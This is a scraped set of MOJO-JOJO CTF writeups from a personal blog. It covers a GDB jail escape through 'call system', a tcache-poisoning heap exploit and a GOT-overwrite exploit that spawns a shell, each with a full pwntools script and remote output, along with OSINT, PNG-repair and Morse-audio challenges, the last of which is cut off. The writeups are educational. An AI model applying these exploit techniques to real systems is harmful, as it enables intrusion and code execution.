details:\nPlayer Name Rating PlayStyle+ Team National Team Number Solution Process # Step 1: Initial Card Analysis # The provided card was a special green card with the following characteristics:\nShooting: 99 League: Bundesliga Position: CDM (Central Defensive Midfielder) Step 2: Card Type Identification # The first critical step was identifying the card\u0026rsquo;s promo type. To accomplish this, I visited Futbin, a comprehensive FIFA/FC card database with extensive filtering capabilities.\nI systematically browsed through different special card designs across recent titles, starting from FC 26 and working backwards. After comparing multiple card styles, I identified the matching design in FC 24 as the Winter Wildcards promo.\nStep 3: Filtering and Search # With the card promo identified, I used Futbin\u0026rsquo;s filtering system:\nPromo: Winter Wildcards League: Bundesliga Position: CDM This filtering dramatically narrowed the search results to just two cards.\nStep 4: Player Confirmation # A quick comparison between the two remaining cards revealed that Ellyes Skhiri was the only player with 99 Shooting, confirming the card\u0026rsquo;s identity.\nStep 5: Gathering Required Information # With the player and promo confirmed, I collected the remaining required details through Futbin and verification searches:\nDetail Value Player Name Skhiri Rating 87 PlayStyle+ Intercept+ Team Frankfurt National Team Number 17 Flag Construction # Using the gathered information, the flag was constructed as follows:\nMOJO-JOJO{Skhiri_87_Intercept+_Frankfurt_17} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/osint/fifa-fc/","section":"Writeups","summary":"","title":"FIFA / FC - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"During the MOJO-JOJO CTF, I solved Forensics challenges.\nHere I share my approach, mistakes, and how I got the flags. Thanks to the MOJO-JOJO team üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/forensics/","section":"Writeups","summary":"","title":"Forensics","type":"writeups"},{"content":"Challenge Name: GATE\nCategory: Misc\nCTF: MOJO-JOJO\nDescription: DO U KNOW THAT GDB STANDS FOR GO DOWN BITCH Connection: nc 4.233.210.175 1339\nTL;DR # The challenge drops us into a restricted GDB session with a binary called target. By leveraging GDB\u0026rsquo;s call command to invoke system() from the dynamically linked libc, we can execute arbitrary shell commands, read the flag from flag.txt, and escape the jail.\nChallenge Artefacts # Binary: target (provided) Connection: nc 4.233.210.175 1339 Environment: GDB jail with breakpoint at target.c:12 Initial Connection # $ nc 4.233.210.175 1339 Reading symbols from ./target... The GATE is closed. You are in the jail. Do you know what gdb stands for? GO DOWN BITCH!!!!!! Temporary breakpoint 1 at 0x401170: file target.c, line 12. [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Temporary breakpoint 1, main () at target.c:12 (gdb) Key observations:\nWe\u0026rsquo;re given a GDB prompt with the binary stopped at a breakpoint The binary is dynamically linked with libc The challenge message hints at using GDB (\u0026ldquo;GO DOWN BITCH\u0026rdquo;) Understanding the Environment # Available Functions # Using info functions reveals standard libc functions:\nsystem@plt - Critical for exploitation puts@plt, setvbuf@plt, sleep@plt Custom functions from target.c:\nforce_link_system (line 7) main (line 11) File System Structure # We can explore the file system using GDB\u0026rsquo;s call command:\n(gdb) call system(\u0026#34;ls -la\u0026#34;) Output:\ntotal 60 drwxr-x--- 1 root ctf 4096 Feb 7 01:00 . drwxr-xr-x 1 root root 4096 Feb 7 01:00 .. -rwxr-x--- 1 root ctf 220 Jan 6 2022 .bash_logout -rwxr-x--- 1 root ctf 3771 Jan 6 2022 .bashrc -rwxr-x--- 1 root ctf 807 Jan 6 2022 .profile -rwxr----- 1 root ctf 57 Feb 7 01:00 flag.txt -rwxr-x--- 1 root ctf 23 Feb 7 00:09 gdbinit -rwxr-x--- 1 root ctf 1655 Feb 7 00:09 jail.py -rwxr-xr-x 1 root root 62 Feb 7 01:00 start.sh -rwxr-x--- 1 root ctf 18856 Feb 7 00:09 target $1 = 0 The flag is in flag.txt!\nFinding the Vulnerability # GDB\u0026rsquo;s call Command # GDB provides a call command that executes functions in the debugged program\u0026rsquo;s context. Since the target binary is dynamically linked with libc, we have access to powerful functions like system().\nSyntax:\ncall function_name(arguments) Why This Works # The binary links against libc, which provides system() GDB\u0026rsquo;s call executes functions in the process\u0026rsquo;s memory space system() spawns a shell and runs arbitrary commands No authentication or restrictions prevent this execution Exploitation Path # The attack is straightforward:\nGDB prompt ‚Üí call system(\u0026#34;command\u0026#34;) ‚Üí arbitrary code execution ‚Üí read flag Exploitation Steps # Connect to the challenge:\nnc 4.233.210.175 1339 Test command execution:\n(gdb) call system(\u0026#34;ls -la\u0026#34;) Read the flag:\n(gdb) call system(\u0026#34;cat flag.txt\u0026#34;) Output:\n[Detaching after vfork from child process 1666] MOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng} $1 = 0 Solver Script # One-liner # echo \u0026#39;call system(\u0026#34;cat flag.txt\u0026#34;)\u0026#39; | nc 4.233.210.175 1339 Using heredoc # nc 4.233.210.175 1339 \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; call system(\u0026#34;cat flag.txt\u0026#34;) EOF Expected output:\nMOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng} Final Flag # MOJO-JOJO{G0_D0wn_B1tch_D1r3ct_M3m0ry_Ex3cut10n_1s_K1ng} Takeaways # Never expose GDB to untrusted users: The call command provides direct function execution, bypassing all security boundaries. Dynamic linking risks: Linked libc functions (system, exec) become attack vectors when accessible through debugging interfaces. Jail escapes via debuggers: GDB\u0026rsquo;s powerful introspection and execution capabilities make it a dangerous tool in the wrong hands. Challenge naming: \u0026ldquo;GO DOWN BITCH\u0026rdquo; cleverly hints at using GDB\u0026rsquo;s Direct Memory Execution capabilities (as referenced in the flag). Defense: Sandbox debugging interfaces, restrict available functions, or avoid exposing debuggers entirely in production/CTF environments. Additional Notes # The challenge likely uses a Python script (jail.py) to wrap the GDB session and provide the interactive environment. The gdbinit file probably sets up the initial breakpoint and restrictions. However, these restrictions don\u0026rsquo;t prevent the use of the call command, which is the intended exploitation vector.\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/misc/gate/","section":"Writeups","summary":"","title":"GATE - CTF Writeup","type":"writeups"},{"content":"Challenge Name: HIP-HOP\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: I KEEP POPPING TILL I DIE HIP-HOP TILL I DIE SEYYAH\nConnection: nc 4.233.210.175 9008\nChallenge Overview # The challenge presents a heap-based music track manager with a hidden authentication function. By exploiting a heap overflow vulnerability combined with a PIE leak, we can corrupt the tcache freelist, gain arbitrary write access to the GOT, and hijack control flow to execute a secret function that reads and exfiltrates the flag.\nInitial Analysis # Binary Information # $ file hiphop hiphop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./dist/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped $ checksec hiphop Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Program Behavior # ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù [ S T U D I O M A N A G E R ] [*] Console ready at 0x7fff1234ab20 1.Add 2.Drop 3.Edit 4.Exit \u0026gt;\u0026gt; The program leaks a heap/data pointer on startup via the [*] Console ready at... message. This is critical for defeating PIE.\nCore Functionality # The binary implements a simple track management system:\nMenu Options: 1. Add - Allocate a new track (0x100 bytes) 2. Drop - Free an existing track 3. Edit - Edit track lyrics (VULNERABLE) 4. Exit - Exit the program Each track is stored in a global studio array that holds up to 10 heap pointers.\nVulnerability Discovery # 1. PIE Leak in Banner # On startup, the program prints [*] Console ready at 0x..., which leaks a pointer from the .data section.\nDisassembly of main:\ndf7: 48 8d 05 c2 22 20 00 lea rax,[rip+0x2022c2] # Calculate studio address dfe: 48 89 c6 mov rsi,rax # Pass to printf e01: 48 8d 3d c0 05 00 00 lea rdi,[rip+0x5c0] # \u0026#34;[*] Console ready at %p\\n\u0026#34; e08: b8 00 00 00 00 mov eax,0x0 e0d: e8 1e fa ff ff call 830 \u0026lt;printf@plt\u0026gt; The leaked address points to studio+0x1000 at runtime. By computing PIE_base = leak - 0x2030c0, we defeat ASLR and leak all function addresses.\nTesting the leak:\n$ ./ld-linux-x86-64.so.2 --library-path . ./hiphop [*] Console ready at 0x7f5d6b4030c0 From this, we derive: pie_base = 0x7f5d6b4030c0 - 0x2030c0\n2. Heap Overflow in edit_lyrics() # The edit_lyrics function reads user input directly into a 0x100-byte heap chunk but requests 0x124 bytes from stdin.\nVulnerable disassembly:\nccb: 55 push rbp ccc: 48 89 e5 mov rbp,rsp ccf: 48 83 ec 10 sub rsp,0x10 # Allocate 16 bytes on stack cd3: 64 48 8b 04 25 28 00 mov rax,QWORD PTR fs:0x28 # Load canary cda: 00 00 cdc: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax ; ... prompt and read index ... d5e: ba 24 01 00 00 mov edx,0x124 # Read 0x124 (292) bytes d63: 48 89 c6 mov rsi,rax # rsi = chunk pointer d66: bf 00 00 00 00 mov edi,0x0 # edi = stdin d6b: e8 d0 fa ff ff call 840 \u0026lt;read@plt\u0026gt; # read(0, chunk, 0x124) The allocation is 0x100 (256) bytes, but read() accepts 0x124 (292) bytes. This is a 36-byte overflow into the next chunk\u0026rsquo;s metadata.\nImpact:\nOn glibc 2.27, freed chunks are stored in a tcache freelist. A heap chunk layout looks like:\n[Chunk N] 0x00-0xFF: User data 0x100-0x107: prev_size (of chunk N+1) 0x108-0x10F: size (of chunk N+1) 0x110-0x1FF: tcache forward ptr (fd) By overflowing 36 bytes from chunk N, we can corrupt the forward pointer of chunk N+1\u0026rsquo;s tcache entry.\n3. Hidden Function: mic_check() # The binary contains a privileged function that executes a system command:\nDisassembly of mic_check:\na8e: 48 8d 3d 1b 08 00 00 lea rdi,[rip+0x81b] # \u0026#34;[+] Master Access...\u0026#34; a95: b8 00 00 00 00 mov eax,0x0 a9a: e8 91 fd ff ff call 830 \u0026lt;printf@plt\u0026gt; a9f: 48 8d 3d 42 08 00 00 lea rdi,[rip+0x842] # \u0026#34;Retrieving secret flag...\u0026#34; aa6: b8 00 00 00 00 mov eax,0x0 aab: e8 80 fd ff ff call 830 \u0026lt;printf@plt\u0026gt; ab0: 48 8d 3d 59 08 00 00 lea rdi,[rip+0x859] # \u0026#34;/bin/cat flag.txt\u0026#34; ab7: e8 64 fd ff ff call 820 \u0026lt;system@plt\u0026gt; # system(\u0026#34;/bin/cat flag.txt\u0026#34;) abc: bf 00 00 00 00 mov edi,0x0 ac1: e8 ca fd ff ff call 890 \u0026lt;exit@plt\u0026gt; This function is never called through normal execution but we can hijack control flow to reach it by overwriting free@GOT.\nKey Offsets (PIE-relative) # Leak address: PIE + 0x2030c0 free@GOT: PIE + 0x202018 mic_check: PIE + 0x0a73 Exploitation Strategy # Overview # The attack chain:\nParse PIE leak to compute pie_base Allocate chunk 0 into heap Allocate chunk 1 into heap Free chunk 1 to put it in tcache Overflow chunk 0 to corrupt chunk 1\u0026rsquo;s tcache forward pointer ‚Üí point to free@GOT Allocate twice to get a chunk overlapping free@GOT Overwrite free@GOT with mic_check address Trigger free() to jump into mic_check and print the flag Step 1: Parse PIE Leak # # Receive banner and extract PIE leak banner = io.recvuntil(b\u0026#34;Console ready at \u0026#34;) leak_line = io.recvline().strip() # Parse hex address (colored output has ANSI codes) m = re.search(rb\u0026#34;0x[0-9a-fA-F]+\u0026#34;, leak_line) leak = int(m.group(0), 16) # Compute PIE base pie_base = leak - 0x2030c0 free_got = pie_base + 0x202018 mic_check = pie_base + 0x0a73 log.info(f\u0026#34;leak = {hex(leak)}\u0026#34;) log.info(f\u0026#34;pie_base = {hex(pie_base)}\u0026#34;) log.info(f\u0026#34;free_got = {hex(free_got)}\u0026#34;) log.info(f\u0026#34;mic_check = {hex(mic_check)}\u0026#34;) Step 2: Allocate Chunks and Free One # # Allocate chunk 0 add(io) # Menu: 1 # Allocate chunk 1 add(io) # Menu: 1 # Free chunk 1 into tcache drop(io, 1) # Menu: 2, then index: 1 At this point, chunk 1 is in the tcache freelist with its forward pointer pointing to the next free chunk (or NULL).\nStep 3: Overflow and Corrupt Tcache # We overflow chunk 0 (0x100 bytes) with 0x124 bytes to overwrite chunk 1\u0026rsquo;s tcache forward pointer.\nThe overflow structure:\n[0x100 bytes padding (A)] [0x08 bytes: prev_size = 0x110] [0x08 bytes: size = 0x111] [0x08 bytes: forward_ptr = free@GOT] [0x0c bytes: padding (B)] payload = b\u0026#34;A\u0026#34; * 0x100 # Chunk 0 data payload += p64(0x110) # prev_size of next chunk payload += p64(0x111) # size of next chunk (0x110 | PREV_INUSE) payload += p64(free_got) # tcache forward pointer ‚Üí free@GOT payload += b\u0026#34;B\u0026#34; * 0x0c # Padding edit(io, 0, payload) # Menu: 3, then index: 0, then send payload Step 4: Double Allocate to Overlap free@GOT # # This allocation pops chunk 1 from tcache (the real freed chunk) add(io) # Menu: 1 ‚Üí Track 1 # This allocation\u0026#39;s pointer is the corrupted forward pointer (free@GOT) add(io) # Menu: 1 ‚Üí Track 2 (overlaps free@GOT) Now track 2\u0026rsquo;s heap chunk overlaps with the free@GOT entry in the GOT table.\nStep 5: Overwrite free@GOT # Writing to the overlapping chunk writes directly into the GOT:\nedit(io, 2, p64(mic_check)) # Menu: 3, then index: 2, then write mic_check address Now free@GOT points to mic_check instead of the real free() function.\nStep 6: Trigger Execution # drop(io, 0) # Menu: 2, then index: 0 When free() is called, it jumps to mic_check, which executes system(\u0026quot;/bin/cat flag.txt\u0026quot;).\nComplete Exploit Code # #!/usr/bin/env python3 from pwn import * import re context.binary = \u0026#34;./hiphop\u0026#34; context.log_level = \u0026#34;info\u0026#34; MENU = b\u0026#34;\u0026gt;\u0026gt; \u0026#34; def start(): if args.REMOTE: return remote(\u0026#34;4.233.210.175\u0026#34;, 9008) return process([\u0026#34;./ld-linux-x86-64.so.2\u0026#34;, \u0026#34;--library-path\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;./hiphop\u0026#34;]) def add(io): \u0026#34;\u0026#34;\u0026#34;Allocate a track.\u0026#34;\u0026#34;\u0026#34; io.sendlineafter(MENU, b\u0026#34;1\u0026#34;) io.recvline() def drop(io, idx): \u0026#34;\u0026#34;\u0026#34;Free a track by index.\u0026#34;\u0026#34;\u0026#34; io.sendlineafter(MENU, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;Idx: \u0026#34;, str(idx).encode()) def edit(io, idx, data): \u0026#34;\u0026#34;\u0026#34;Edit track lyrics (perform overflow).\u0026#34;\u0026#34;\u0026#34; io.sendlineafter(MENU, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;Idx: \u0026#34;, str(idx).encode()) io.send(data) def main(): io = start() # Step 1: Parse PIE leak banner = io.recvuntil(b\u0026#34;Console ready at \u0026#34;) leak_line = io.recvline().strip() m = re.search(rb\u0026#34;0x[0-9a-fA-F]+\u0026#34;, leak_line) if not m: log.error(f\u0026#34;Failed to parse leak: {leak_line!r}\u0026#34;) return leak = int(m.group(0), 16) pie_base = leak - 0x2030c0 free_got = pie_base + 0x202018 mic_check = pie_base + 0x0a73 log.info(f\u0026#34;leak = {hex(leak)}\u0026#34;) log.info(f\u0026#34;pie_base = {hex(pie_base)}\u0026#34;) log.info(f\u0026#34;free_got = {hex(free_got)}\u0026#34;) log.info(f\u0026#34;mic_check = {hex(mic_check)}\u0026#34;) # Step 2: Allocate chunk 0 add(io) # Step 3: Allocate chunk 1 add(io) # Step 4: Free chunk 1 into tcache drop(io, 1) # Step 5: Overflow chunk 0 into chunk 1\u0026#39;s metadata payload = b\u0026#34;A\u0026#34; * 0x100 payload += p64(0x110) # prev_size payload += p64(0x111) # size (with PREV_INUSE bit) payload += p64(free_got) # tcache fd ‚Üí free@GOT payload += b\u0026#34;B\u0026#34; * 0x0c # padding edit(io, 0, payload) # Step 6: Allocate twice to overlap free@GOT add(io) # Pop real chunk 1 add(io) # Allocate at free@GOT # Step 7: Overwrite free@GOT with mic_check edit(io, 2, p64(mic_check)) # Step 8: Trigger free() ‚Üí mic_check() drop(io, 0) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() Result # Running against the remote server:\n$ python3 solve.py REMOTE=1 [*] Opening connection to 4.233.210.175 on port 9008: Done [*] leak = 0x5e2e32600000 [*] pie_base = 0x5e2e32400000 [*] free_got = 0x5e2e32602018 [*] mic_check = 0x5e2e32400a73 [*] Switching to interactive mode [+] Master Access Token Accepted! Retrieving secret flag... MOJO-JOJO{h3ap_p0is0n1ng_i5_v3ry_3asy_0n_2_27} [*] Got EOF while reading in interactive Final Flag # MOJO-JOJO{h3ap_p0is0n1ng_i5_v3ry_3asy_0n_2_27} Key Takeaways # PIE Leak: Simple startup banner leak gives us all addresses Tcache Poisoning: glibc 2.27 lacks safe-linking, enabling trivial heap overflow ‚Üí freelist corruption Partial RELRO: Writable GOT allows function pointer hijacking Heap Overflow: A 36-byte overflow (0x124 - 0x100) is sufficient to corrupt tcache metadata Call Chain: free() ‚Üí mic_check() ‚Üí system(\u0026quot;/bin/cat flag.txt\u0026quot;) ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/hip-hop/","section":"Writeups","summary":"","title":"HIP-HOP - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Hmmm\nCategory: Forensics\nCTF: MOJO-JOJO\nDescription: found this image but i can\u0026rsquo;t open it ; can u help meee\nChallenge Overview # We were given a file named secret.png. The image could not be opened normally, and tools like binwalk showed no useful output.\nAt first glance, it looked like a corrupted PNG file.\nFile Analysis # Running:\nfile secret.png Returned:\nsecret.png: data And:\nexiftool secret.png Returned a File format error.\nThis indicated that the file header was invalid and the image was not recognized as a proper PNG file.\nHex Inspection # Using:\nxxd secret.png | head We observed that the PNG signature was incorrect.\nA valid PNG header should start with:\n89 50 4E 47 0D 0A 1A 0A But the file began with slightly altered bytes.\nFurther inspection showed that the PNG structure (IHDR, IDAT, etc.) was still present, meaning only the header was corrupted.\nRepairing the PNG Header # We manually replaced the first 8 bytes with the correct PNG signature:\ncp secret.png repaired.png printf \u0026#39;\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\u0026#39; | dd of=repaired.png bs=1 count=8 conv=notrunc After that:\nfile repaired.png Correctly identified it as:\nPNG image data, 1030 x 110, 8-bit/color RGBA, non-interlaced The image could now be opened successfully.\nQR Code Recovery # The repaired image contained a distorted QR code.\nAttempts to decode it using:\nzbarimg repaired.png Failed.\nThe QR appeared partially damaged or misaligned, preventing common desktop tools from decoding it.\nInstead of continuing manual reconstruction, we tried scanning the image using a mobile application called QRQR from the Play Store.\nThe mobile scanner successfully decoded the QR code and revealed the flag.\nFinal Flag # MOJO-JOJO{Longg_Qr_C0de3e!} ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/forensics/hmmm/","section":"Writeups","summary":"","title":"Hmmm - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"During the MOJO-JOJO CTF, I solved Miscellaneous challenges. Here I share my approach, mistakes, and how I got the flags. Thanks to the MOJO-JOJO team üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/misc/","section":"Writeups","summary":"","title":"Misc","type":"writeups"},{"content":"Challenge Name: MOJO_LAB\nCategory: PWN\nCTF: MOJO-JOJO\nDescription: TOO LAZY FOR A DESCRIPTION\nConnection: nc mojo-pwn.securinets.tn 9007\nChallenge Overview # MOJO_LAB is a binary exploitation challenge featuring a Powerpuff Girls themed laboratory program. The binary presents a menu-based interface where users can modify DNA sequences, synthesize chemicals, or abandon the laboratory.\nInitial Reconnaissance # Binary Information # $ file main main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, not stripped Security Features # NX (Non-Executable Stack): Enabled (RW stack, not RWX) PIE: Disabled (executable at fixed address) Partial RELRO: GOT is writable Stack Canary: Present in some functions Key Observations # $ strings main | grep -E \u0026#34;bin|NOOOOO\u0026#34; /bin/sh [MOJO JOJO]: NOOOOO! You have compromised my laboratory! The binary contains a /bin/sh string and a suspicious success message, suggesting there\u0026rsquo;s a win function.\nVulnerability Analysis # The Lab Win Function # Disassembling the binary reveals a lab_win function at address 0x4011b6:\n00000000004011b6 \u0026lt;lab_win\u0026gt;: 4011b6: push rbp 4011b7: mov rbp,rsp ... 4011e9: lea rax,[rip+0xe53] # 0x402043 (\u0026#34;/bin/sh\u0026#34;) 4011f0: mov rdi,rax 4011f3: call 401060 \u0026lt;system@plt\u0026gt; This function calls system(\u0026quot;/bin/sh\u0026quot;), giving us a shell if we can reach it.\nThe Arbitrary Write Primitive # The main vulnerability is in option 1 (\u0026ldquo;Modify DNA Sequence\u0026rdquo;). Here\u0026rsquo;s the relevant disassembly:\n4014b0: mov eax,DWORD PTR [rbp-0x10] ; User input (offset) 4014b3: xor eax,0x7050 ; XOR with 0x7050 4014b8: cdqe ; Sign extend to 64-bit 4014ba: lea rdx,[rax+rax*1] ; Multiply by 2 4014be: mov rax,QWORD PTR [rbp-0x8] ; dna_sequences base (0x404120) 4014c2: add rax,rdx ; Calculate target address 4014c5: mov edx,DWORD PTR [rbp-0xc] ; User value to write 4014c8: mov WORD PTR [rax],dx ; Write 2 bytes! This code allows us to write 2 bytes to an arbitrary memory location using the formula:\ntarget_address = dna_sequences_base + ((user_input ^ 0x7050) * 2) Where:\ndna_sequences_base = 0x404120 (in .bss section) We control the user input (signed 32-bit integer) We can write any 2-byte value The cdqe instruction sign-extends the result, meaning negative offsets work, allowing us to write to addresses before dna_sequences_base - including the GOT!\nExploitation Strategy # Why GOT Overwrite? # Since PIE is disabled and the GOT is writable (Partial RELRO), we can:\nUse the arbitrary write to overwrite a GOT entry Make it point to lab_win instead of the real library function Trigger that function to get our shell Target Selection: printf@got # Looking at option 2 in the menu:\n4014df: cmp DWORD PTR [rbp-0x14],0x2 4014e3: jne 40151c \u0026lt;main+0x17e\u0026gt; 4014e5: lea rax,[rip+0xdc4] 4014ec: mov rdi,rax 4014ef: call 401263 \u0026lt;print_str\u0026gt; 4014f4: lea rax,[rip+0x2ba5] # 0x4040a0 \u0026lt;chemical_x\u0026gt; 4014fb: mov rdi,rax 4014fe: mov eax,0x0 401503: call 401080 \u0026lt;printf@plt\u0026gt; ; printf called here! Option 2 calls printf, making it the perfect target!\nMultiple Writes # Since we can only write 2 bytes at a time but need to overwrite an 8-byte GOT entry, we perform 4 consecutive writes:\nWrite bytes 0-1 of lab_win (0x11b6) to printf@got (0x404028) Write bytes 2-3 of lab_win (0x0040) to printf@got+2 (0x40402a) Write bytes 4-5 of lab_win (0x0000) to printf@got+4 (0x40402c) Write bytes 6-7 of lab_win (0x0000) to printf@got+6 (0x40402e) This fully overwrites printf@got with 0x00000000004011b6 (lab_win address).\nOffset Calculation # For each write, we calculate the offset:\noffset_raw = (target_address - dna_sequences_base) // 2 offset = offset_raw ^ 0x7050 For printf@got (0x404028):\noffset_raw = (0x404028 - 0x404120) // 2 = -0xf8 // 2 = -124 offset = -124 ^ 0x7050 = -28716 Exploit Code # #!/usr/bin/env python3 from pwn import * import time context.arch = \u0026#39;amd64\u0026#39; context.log_level = \u0026#39;info\u0026#39; HOST = \u0026#39;mojo-pwn.securinets.tn\u0026#39; PORT = 9007 lab_win = 0x4011b6 dna_sequences = 0x404120 printf_got = 0x404028 def write_word(io, target_addr, value): \u0026#34;\u0026#34;\u0026#34;Write 2 bytes to target address\u0026#34;\u0026#34;\u0026#34; offset_raw = (target_addr - dna_sequences) // 2 offset = offset_raw ^ 0x7050 log.info(f\u0026#34;Writing {hex(value)} to {hex(target_addr)}\u0026#34;) io.sendline(b\u0026#39;1\u0026#39;) time.sleep(0.3) io.recv() io.sendline(str(offset).encode()) time.sleep(0.3) io.recv() io.sendline(str(value).encode()) time.sleep(0.3) io.recv() def exploit(): io = remote(HOST, PORT) time.sleep(1) io.recv() # Initial input (no \u0026#39;%\u0026#39; character allowed) io.sendline(b\u0026#39;test\u0026#39;) time.sleep(0.5) io.recv() # Overwrite printf@got with lab_win (4 writes of 2 bytes each) write_word(io, printf_got, lab_win \u0026amp; 0xFFFF) write_word(io, printf_got + 2, (lab_win \u0026gt;\u0026gt; 16) \u0026amp; 0xFFFF) write_word(io, printf_got + 4, (lab_win \u0026gt;\u0026gt; 32) \u0026amp; 0xFFFF) write_word(io, printf_got + 6, (lab_win \u0026gt;\u0026gt; 48) \u0026amp; 0xFFFF) # Trigger printf by choosing option 2 log.success(\u0026#34;Printf hijacked! Triggering...\u0026#34;) io.sendline(b\u0026#39;2\u0026#39;) time.sleep(1) log.success(\u0026#34;Shell acquired!\u0026#34;) io.interactive() if __name__ == \u0026#39;__main__\u0026#39;: exploit() Execution # $ python3 exploit2.py [+] Opening connection to mojo-pwn.securinets.tn on port 9007: Done [*] Writing 0x11b6 to 0x404028 [*] Writing 0x40 to 0x40402a [*] Writing 0x0 to 0x40402c [*] Writing 0x0 to 0x40402e [+] Printf hijacked! Triggering... [+] Shell acquired! [*] Switching to interactive mode $ ls flag.txt main $ cat flag.txt MOJO-JOJO{22222222_LAZZZZZZZYYYYYYYYYY_JU5T_L1KE_A_LINKER} Final Flag # MOJO-JOJO{22222222_LAZZZZZZZYYYYYYYYYY_JU5T_L1KE_A_LINKER} Key Takeaways # Arbitrary Write Primitives: Even limited writes (2 bytes at a time) can be powerful when combined strategically GOT Overwrites: With Partial RELRO, the GOT remains writable and is a prime target for function hijacking Sign Extension Matters: The cdqe instruction allowed negative offsets, expanding our write range Multiple Writes: Don\u0026rsquo;t give up if you can only write small amounts - multiple writes can achieve the same goal PIE Disabled = Fixed Addresses: Makes exploitation much easier as all addresses are predictable ","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/binary-exploitation/mojo_lab/","section":"Writeups","summary":"","title":"MOJO_LAB - CTF Writeup","type":"writeups"},{"content":"","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/","section":"CTFs","summary":"","title":"MOJO-JOJO - CTF Writeups","type":"ctfs"},{"content":"During the MOJO-JOJO CTF, I successfully solved challenges across multiple categories, including Forensics, Binary Exploitation, OSINT, Misc, and Crypto.\nIn this section, I document how I approached each challenge, the mistakes I made along the way, and the techniques that ultimately led me to the flags.\nThese writeups serve both as a personal knowledge base and as a learning resource for anyone interested in CTFs and practical problem-solving.\nThanks to the MOJO-JOJO team for organizing engaging and educational challenges üêµüß†\n","date":"11 February 2026","externalUrl":null,"permalink":"/writeups/mojo-jojo/","section":"Writeups","summary":"","title":"MOJO-JOJO - CTF Writeups","type":"writeups"},{"content":"Challenge Name: Nature Symphony\nCategory: Forensics\nCTF: MOJO-JOJO\nDescription: While exploring an abandoned research facility, you discovered two audio recordings labeled rain.wav and fire.wav.The recordings seem ordinary at first - just sounds of nature. But something feels off\u0026hellip;\nOverview # This challenge involves decoding Morse code from two audio files: fire.wav and rain.wav. Both files contain Morse audio signals that are not initially clear, but can be analyzed using audio editing software like Audacity.\nAudio Analysis # When the audio files are opened in Audacity and viewed in the spectrogram mode, the Morse characters become visible. The following Morse code sequences were extracted:\nExtracted Morse Code # From fire.wav:\n-- .--- -...- --- --- .---- .-.. ...- ..--.- ..- .. ..--.- . . ...-- . From rain.wav:\n--- --- .--- .--- -.--. ..--.- ---- ...-- .- -.. ----- .... .... .... .... -.--.- Morse Code Conversion # Converting the extracted Morse code to characters yields:\nFrom 